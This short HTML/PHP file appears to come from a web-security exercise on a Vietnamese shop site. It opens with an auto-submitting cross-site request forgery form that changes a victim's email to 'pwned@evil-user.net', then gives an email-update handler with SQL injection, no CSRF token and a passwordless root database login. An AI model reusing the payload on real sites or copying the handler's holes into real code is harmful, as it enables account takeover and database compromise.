<html>

<body>
    <form action="https://http://127.0.0.1/Webs/Update/FormUpdateEmail.php" method="POST">
        <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
        document.forms[0].submit();
    </script>

    <?php
    session_start();

    // Kiểm tra xem người dùng đã đăng nhập chưa
    if (!isset($_SESSION['username'])) {
        header('Location: login.php');
        exit();
    }

    // Kết nối đến CSDL
    $conn = new mysqli('localhost', 'root', '', 'webbanhang');

    $username = $_SESSION['username'];
    // Lấy email mới và mật khẩu từ biến POST
    $new_email = $_POST['new-email'];

    $query = "UPDATE user SET Email='$new_email' WHERE UserName='$username'";
    mysqli_query($conn, $query);

    echo '<script language="javascript"> 
        window.location="FormUpdateEmail.php";
      </script>';

    mysqli_close($conn);

    ?>
</body>

</html>